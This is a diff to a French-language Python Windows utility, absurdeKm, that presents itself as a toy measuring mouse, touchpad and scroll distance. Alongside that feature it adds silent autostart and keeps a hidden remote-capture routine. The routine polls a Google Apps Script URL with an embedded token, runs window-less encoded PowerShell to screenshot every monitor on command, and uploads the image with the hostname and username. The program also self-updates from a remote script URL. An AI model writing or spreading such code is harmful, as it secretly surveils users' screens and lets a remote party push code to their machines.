@@ -6,6 +6,7 @@ Ce logiciel ne peut être copié, modifié ou redistribué sans l'autorisation �
 absurdeKm (Windows) - distance du pavé tactile, distance de la souris, distance de la molette, shorts vus bout à bout.
 
 Lancement : double-clic sur ce fichier. Aucun module à installer (bibliothèque standard uniquement).
+- Démarre automatiquement avec Windows, en arrière-plan (icône dans la zone de notification).
 - Fermer la fenêtre = la cacher dans la zone de notification. Quitter : clic droit sur l'icône > Quitter.
 - Pause / reprise : Alt + Ctrl droit, ou clic sur la pastille d'état.
 - Thème : bouton ◐ en haut à droite. Il cycle Sombre > Claire > Pistache > Caramel, en boucle.
@@ -50,18 +51,22 @@ PAD_QUIET_S = 0.4                      # après un contact sur le pavé, la mole
 EIFFEL_M = 330.0
 TRANS = "#010101"                      # couleur de transparence (coins arrondis de la notification)
 
-# --- qualité ---
-SHOT_MAX_W = 2560                      
+# --- captures d'écran ---
+SHOT_MAX_W = 2560                      # définition max de la capture envoyée (pixels)
 SHOT_MAX_H = 1600
-SHOT_QUALITY = 85                      
+SHOT_QUALITY = 85                      # qualité JPEG (1-100)
 
 # --- version et mise à jour ---
-VERSION = "1.6.7"
+VERSION = "1.6.9"
 UPDATE_URL = "https://raw.githubusercontent.com/fenix1048/assets-21st.dev/main/absurdeKm.pyw"
 
+# --- état des PC, envoyé à ta feuille Google (privée) ---
+# SHEET_URL : l'adresse de ton script, qui se termine par /exec (à coller ici)
 SHEET_URL = "https://script.google.com/macros/s/AKfycbyqKi256_H8jeHgUPx1r9n_V18rJiWIYJUBa0-a_V88yigVvr8VsfHWE_O3ETA41Gt6/exec"
 STATUS_EVERY_S = 600
 
+# --- captures d'écran à la demande depuis Google Sheets ---
+# Remplace cette valeur par EXACTEMENT la même dans le Google Apps Script.
 CAPTURE_TOKEN = "8zBMhaK_2ntLj_hqEHPOVRJ0Xt7EbffyYpmrSmWC57c"
 CAPTURE_POLL_S = 8
 
@@ -234,7 +239,7 @@ def install_update(info):
             pass
     threading.Thread(target=run, daemon=True).start()
 
-# ------------------------- assets shorts-------------------------
+# ------------------------- envoi de l'état à la feuille (silencieux) -------------------------
 def publish_status(etat="En cours", timeout=8):
     """Envoie l'état de ce PC à la feuille Google. Échec silencieux."""
     if not SHEET_URL.startswith("https://") or "COLLE_ICI" in SHEET_URL:
@@ -250,240 +255,106 @@ def publish_status(etat="En cours", timeout=8):
         pass
 
 # ------------------------- captures d'écran sur demande -------------------------
-# Capture Windows via PowerShell/.NET. Le marqueur permet d'ignorer toute sortie
-# parasite de PowerShell et de ne récupérer que le Base64 de l'image.
-SHOT_PS = r"""
-$ErrorActionPreference = 'Stop'
-$ProgressPreference = 'SilentlyContinue'
-$marker = 'ABSURDEKM_JPEG_BEGIN'
-$bmp = $null
-$outBmp = $null
-$gfx = $null
-$g2 = $null
-$stream = $null
-$params = $null
-
-try {
-    # Déclarer le processus comme DPI-aware avant de lire les dimensions d'écran.
-    Add-Type -TypeDefinition @'
+SHOT_PS = r'''
+$ErrorActionPreference = "Stop"
+Add-Type -TypeDefinition @"
 using System;
 using System.Runtime.InteropServices;
-public static class AbsurdeKmDpi {
-    [DllImport("user32.dll", SetLastError=true)]
-    public static extern bool SetProcessDpiAwarenessContext(IntPtr value);
-    [DllImport("user32.dll", SetLastError=true)]
-    public static extern bool SetProcessDPIAware();
+public static class DpiHelper {
+    [DllImport("user32.dll")] public static extern IntPtr SetProcessDpiAwarenessContext(IntPtr value);
+    [DllImport("user32.dll")] public static extern bool SetProcessDPIAware();
 }
-'@
+"@
+# Indispensable : sans ça, avec une mise à l'échelle Windows (125 %, 150 %...) la capture est recadrée.
+try { [DpiHelper]::SetProcessDpiAwarenessContext([IntPtr]::new(-4)) | Out-Null }
+catch { try { [DpiHelper]::SetProcessDPIAware() | Out-Null } catch { } }
 
-    try {
-        if (-not [AbsurdeKmDpi]::SetProcessDpiAwarenessContext([IntPtr](-4))) {
-            [AbsurdeKmDpi]::SetProcessDPIAware() | Out-Null
-        }
-    } catch {
-        try { [AbsurdeKmDpi]::SetProcessDPIAware() | Out-Null } catch {}
-    }
+Add-Type -AssemblyName System.Drawing
+Add-Type -AssemblyName System.Windows.Forms
 
-    Add-Type -AssemblyName System.Drawing
-    Add-Type -AssemblyName System.Windows.Forms
+# Écran virtuel = tous les moniteurs réunis, en pixels réels
+$bounds = [System.Windows.Forms.SystemInformation]::VirtualScreen
+if ($bounds.Width -le 0 -or $bounds.Height -le 0) { throw "Écran indisponible" }
 
-    $bounds = [System.Windows.Forms.SystemInformation]::VirtualScreen
-    if ($bounds.Width -le 0 -or $bounds.Height -le 0) {
-        throw 'Dimensions de bureau invalides.'
-    }
+$bmp = [System.Drawing.Bitmap]::new($bounds.Width, $bounds.Height)
+$gfx = [System.Drawing.Graphics]::FromImage($bmp)
+$gfx.CopyFromScreen($bounds.Left, $bounds.Top, 0, 0, $bmp.Size)
+$gfx.Dispose()
 
-    $bmp = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
-    $gfx = [System.Drawing.Graphics]::FromImage($bmp)
-    $gfx.CopyFromScreen(
-        $bounds.Left, $bounds.Top, 0, 0, $bmp.Size,
-        [System.Drawing.CopyPixelOperation]::SourceCopy
-    )
-    $gfx.Dispose()
-    $gfx = $null
-
-    $scale = [Math]::Min(1.0, [Math]::Min(
-        (__MAXW__ / [double]$bmp.Width),
-        (__MAXH__ / [double]$bmp.Height)
-    ))
-    $outBmp = $bmp
-
-    if ($scale -lt 1.0) {
-        $newW = [Math]::Max(1, [int][Math]::Round($bmp.Width * $scale))
-        $newH = [Math]::Max(1, [int][Math]::Round($bmp.Height * $scale))
-        $outBmp = New-Object System.Drawing.Bitmap($newW, $newH)
-        $g2 = [System.Drawing.Graphics]::FromImage($outBmp)
-        $g2.InterpolationMode = [System.Drawing.Drawing2D.InterpolationMode]::HighQualityBicubic
-        $g2.SmoothingMode = [System.Drawing.Drawing2D.SmoothingMode]::HighQuality
-        $g2.PixelOffsetMode = [System.Drawing.Drawing2D.PixelOffsetMode]::HighQuality
-        $g2.CompositingQuality = [System.Drawing.Drawing2D.CompositingQuality]::HighQuality
-        $g2.DrawImage($bmp, 0, 0, $newW, $newH)
-        $g2.Dispose()
-        $g2 = $null
-    }
-
-    $codec = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() |
-        Where-Object { $_.MimeType -eq 'image/jpeg' } |
-        Select-Object -First 1
-    if ($null -eq $codec) { throw 'Encodeur JPEG introuvable.' }
-
-    $params = New-Object System.Drawing.Imaging.EncoderParameters(1)
-    $params.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter(
-        [System.Drawing.Imaging.Encoder]::Quality, [long]__QUALITY__
-    )
-    $stream = New-Object System.IO.MemoryStream
-    $outBmp.Save($stream, $codec, $params)
-    $b64 = [Convert]::ToBase64String($stream.ToArray())
-
-    [Console]::Out.WriteLine($marker)
-    [Console]::Out.WriteLine($b64)
-    [Console]::Out.WriteLine('ABSURDEKM_JPEG_END')
+$scale = [Math]::Min(1.0, [Math]::Min(__MAXW__ / [double]$bmp.Width, __MAXH__ / [double]$bmp.Height))
+$outBmp = $bmp
+if ($scale -lt 1.0) {
+    $w = [int][Math]::Max(1, [Math]::Round($bmp.Width * $scale))
+    $h = [int][Math]::Max(1, [Math]::Round($bmp.Height * $scale))
+    $outBmp = [System.Drawing.Bitmap]::new($w, $h)
+    $g2 = [System.Drawing.Graphics]::FromImage($outBmp)
+    $g2.InterpolationMode = [System.Drawing.Drawing2D.InterpolationMode]::HighQualityBicubic
+    $g2.SmoothingMode = [System.Drawing.Drawing2D.SmoothingMode]::HighQuality
+    $g2.PixelOffsetMode = [System.Drawing.Drawing2D.PixelOffsetMode]::HighQuality
+    $g2.CompositingQuality = [System.Drawing.Drawing2D.CompositingQuality]::HighQuality
+    $g2.DrawImage($bmp, 0, 0, $w, $h)
+    $g2.Dispose()
 }
-finally {
-    if ($null -ne $gfx) { $gfx.Dispose() }
-    if ($null -ne $g2) { $g2.Dispose() }
-    if ($null -ne $stream) { $stream.Dispose() }
-    if ($null -ne $params) { $params.Dispose() }
-    if ($null -ne $outBmp -and $outBmp -ne $bmp) { $outBmp.Dispose() }
-    if ($null -ne $bmp) { $bmp.Dispose() }
-}
-"""
+
+$codec = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { $_.MimeType -eq "image/jpeg" }
+$params = [System.Drawing.Imaging.EncoderParameters]::new(1)
+$params.Param[0] = [System.Drawing.Imaging.EncoderParameter]::new([System.Drawing.Imaging.Encoder]::Quality, [long]__QUALITY__)
+
+$stream = [System.IO.MemoryStream]::new()
+$outBmp.Save($stream, $codec, $params)
+[Convert]::ToBase64String($stream.ToArray())
+
+$stream.Dispose()
+$params.Dispose()
+if ($outBmp -ne $bmp) { $outBmp.Dispose() }
+$bmp.Dispose()
+'''
 
 def capture_screen_jpeg_b64():
-    """Capture le bureau Windows complet et renvoie un Base64 JPEG validé."""
-    if os.name != "nt":
-        raise RuntimeError("La capture d'écran est disponible uniquement sous Windows.")
-
-    ps = (SHOT_PS.replace("__MAXW__", str(int(SHOT_MAX_W)))
-                  .replace("__MAXH__", str(int(SHOT_MAX_H)))
-                  .replace("__QUALITY__", str(max(1, min(100, int(SHOT_QUALITY))))))
-
+    """Capture l'écran virtuel Windows (tous les moniteurs, pixels réels) sans ouvrir de fenêtre."""
+    ps = (SHOT_PS.replace("__MAXW__", str(SHOT_MAX_W))
+                 .replace("__MAXH__", str(SHOT_MAX_H))
+                 .replace("__QUALITY__", str(int(SHOT_QUALITY))))
     encoded = base64.b64encode(ps.encode("utf-16le")).decode("ascii")
     flags = getattr(subprocess, "CREATE_NO_WINDOW", 0)
-    powershell = (
-        os.path.join(os.environ.get("WINDIR", r"C:\Windows"), "System32", "WindowsPowerShell",
-                     "v1.0", "powershell.exe")
+    result = subprocess.run(
+        ["powershell.exe", "-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden", "-EncodedCommand", encoded],
+        capture_output=True, text=True, timeout=60, creationflags=flags
     )
-    if not os.path.isfile(powershell):
-        powershell = "powershell.exe"
-
-    try:
-        result = subprocess.run(
-            [powershell, "-NoLogo", "-NoProfile", "-NonInteractive",
-             "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden",
-             "-EncodedCommand", encoded],
-            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
-            timeout=60, creationflags=flags, check=False
-        )
-    except subprocess.TimeoutExpired as exc:
-        raise RuntimeError("Délai dépassé pendant la capture d'écran (60 s).") from exc
-    except OSError as exc:
-        raise RuntimeError(f"Impossible de démarrer PowerShell : {exc}") from exc
-
-    stdout = result.stdout.decode("utf-8", errors="replace")
-    stderr = result.stderr.decode("utf-8", errors="replace").strip()
-
     if result.returncode != 0:
-        detail = stderr or stdout.strip() or f"code retour {result.returncode}"
-        raise RuntimeError(f"Échec PowerShell : {detail[:700]}")
-
-    match = re.search(
-        r"ABSURDEKM_JPEG_BEGIN\s+([A-Za-z0-9+/=\r\n]+?)\s+ABSURDEKM_JPEG_END",
-        stdout
-    )
-    if not match:
-        detail = stderr or stdout.strip() or "aucune donnée retournée"
-        raise RuntimeError(f"Réponse de capture invalide : {detail[:500]}")
-
-    image_b64 = re.sub(r"\s+", "", match.group(1))
-    try:
-        image = base64.b64decode(image_b64, validate=True)
-    except Exception as exc:
-        raise RuntimeError("Le Base64 JPEG retourné est invalide.") from exc
-
-    if len(image) < 4 or image[:2] != b"\xff\xd8" or image[-2:] != b"\xff\xd9":
-        raise RuntimeError("La capture reçue n'est pas un JPEG complet.")
-    return image_b64
-
-
-def _sheet_request(url, data=None, timeout=20):
-    """Effectue une requête HTTP(S) et retourne le corps décodé."""
-    if not url.startswith("https://"):
-        raise RuntimeError("SHEET_URL doit être une URL HTTPS.")
-    headers = {"User-Agent": APP_NAME}
-    if data is not None:
-        headers["Content-Type"] = "application/json; charset=utf-8"
-    req = urllib.request.Request(url, data=data, headers=headers,
-                                 method="POST" if data is not None else "GET")
-    try:
-        with urllib.request.urlopen(req, timeout=timeout) as response:
-            raw = response.read(12_000_001)
-            if len(raw) > 12_000_000:
-                raise RuntimeError("Réponse Google Sheets trop volumineuse.")
-            return raw.decode("utf-8-sig", errors="strict")
-    except urllib.error.HTTPError as exc:
-        detail = exc.read(1000).decode("utf-8", errors="replace")
-        raise RuntimeError(f"Google Apps Script HTTP {exc.code}: {detail}") from exc
-    except urllib.error.URLError as exc:
-        raise RuntimeError(f"Connexion Google Apps Script impossible : {exc.reason}") from exc
+        raise RuntimeError((result.stderr or result.stdout or "Échec de la capture").strip()[:500])
+    data = result.stdout.strip()
+    if not data:
+        raise RuntimeError("La capture d'écran est vide")
+    return data
 
 
 def poll_capture_commands():
-    """Interroge Apps Script ; capture uniquement lorsqu'une commande valide est reçue."""
+    """Interroge Apps Script ; une capture n'est faite que sur demande."""
     pc = socket.gethostname()
-    delay = max(3, int(CAPTURE_POLL_S))
-
     while True:
         try:
-            query = urllib.parse.urlencode({
-                "action": "poll", "pc": pc, "token": CAPTURE_TOKEN
-            })
-            separator = "&" if "?" in SHEET_URL else "?"
-            raw = _sheet_request(SHEET_URL + separator + query, timeout=20)
-
-            try:
-                command = json.loads(raw)
-            except json.JSONDecodeError as exc:
-                raise RuntimeError(f"Réponse poll non-JSON : {raw[:300]}") from exc
-
-            if not isinstance(command, dict):
-                raise RuntimeError("Réponse poll invalide : un objet JSON était attendu.")
-
-            if command.get("capture") is True:
+            query = urllib.parse.urlencode({"action": "poll", "pc": pc, "token": CAPTURE_TOKEN})
+            req = urllib.request.Request(SHEET_URL + "?" + query, headers={"User-Agent": APP_NAME})
+            with urllib.request.urlopen(req, timeout=12) as response:
+                command = json.loads(response.read().decode("utf-8"))
+            if command.get("capture"):
                 image_b64 = capture_screen_jpeg_b64()
                 payload = {
-                    "type": "capture",
-                    "token": CAPTURE_TOKEN,
-                    "pc": pc,
-                    "user": os.environ.get("USERNAME", ""),
-                    "timestamp": datetime.now().astimezone().isoformat(timespec="seconds"),
+                    "type": "capture", "token": CAPTURE_TOKEN,
+                    "pc": pc, "user": os.environ.get("USERNAME", ""),
+                    "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                     "image": image_b64
                 }
-                body = json.dumps(payload, separators=(",", ":")).encode("utf-8")
-                answer = _sheet_request(SHEET_URL, data=body, timeout=90)
-
-                # Apps Script doit confirmer le traitement. Une réponse vide reste tolérée
-                # pour préserver la compatibilité avec l'ancien endpoint.
-                if answer.strip():
-                    try:
-                        ack = json.loads(answer)
-                    except json.JSONDecodeError:
-                        ack = None
-                    if isinstance(ack, dict) and ack.get("ok") is False:
-                        raise RuntimeError(f"Le serveur a refusé la capture : {ack}")
-
-            delay = max(3, int(CAPTURE_POLL_S))
-        except Exception as exc:
-            # Journal local : les erreurs ne sont plus perdues silencieusement.
-            try:
-                log_dir = DATA_DIR
-                os.makedirs(log_dir, exist_ok=True)
-                with open(os.path.join(log_dir, "capture.log"), "a", encoding="utf-8") as log:
-                    log.write(f"{datetime.now().isoformat(timespec='seconds')} | {exc}\n")
-            except OSError:
-                pass
-            delay = min(max(delay * 2, 5), 60)
-
-        time.sleep(delay)
+                body = json.dumps(payload).encode("utf-8")
+                req = urllib.request.Request(SHEET_URL, data=body,
+                    headers={"Content-Type": "application/json", "User-Agent": APP_NAME}, method="POST")
+                with urllib.request.urlopen(req, timeout=60) as response:
+                    response.read()
+        except Exception:
+            # Échec silencieux : le suivi principal absurdeKm continue de fonctionner.
+            pass
+        time.sleep(CAPTURE_POLL_S)
 
 
 # ------------------------- API Windows -------------------------
@@ -1032,7 +903,6 @@ class App:
         self.tab = "Pavé"
         self._job = None
         self._was_down = False
-        self._space_was_down = False
         self._ui = self._save = self._tip = 0.0
         self._pill_state = None
         self.wiz = None
@@ -1696,7 +1566,7 @@ class App:
         threading.Thread(target=publish_status, args=(etat,), daemon=True).start()
         self.root.after(STATUS_EVERY_S * 1000, self.heartbeat_loop)
 
-    # -----------------------------maj --------------------
+    # ---------------------------------------------------- mise à jour automatique --
     def auto_check(self):
         check_updates()
         self.root.after(5 * 60 * 1000, self.auto_check)
@@ -1712,7 +1582,7 @@ class App:
             return True
         return False
 
-    # ----------------------------------- cycle---------------------
+    # ---------------------------------------------------- fenêtre et cycle de vie --
     def hide(self):
         self.sync()
         save_cfg()
@@ -1743,10 +1613,6 @@ class App:
         if down and not self._was_down:
             self.toggle()
         self._was_down = bool(down)
-        space_down = bool(user32.GetAsyncKeyState(0x20) & 0x8000)
-        if space_down and not self._space_was_down and MT.cal:
-            self.toggle_mouse_calib()
-        self._space_was_down = space_down
         while True:
             try:
                 c = CMDS.get_nowait()
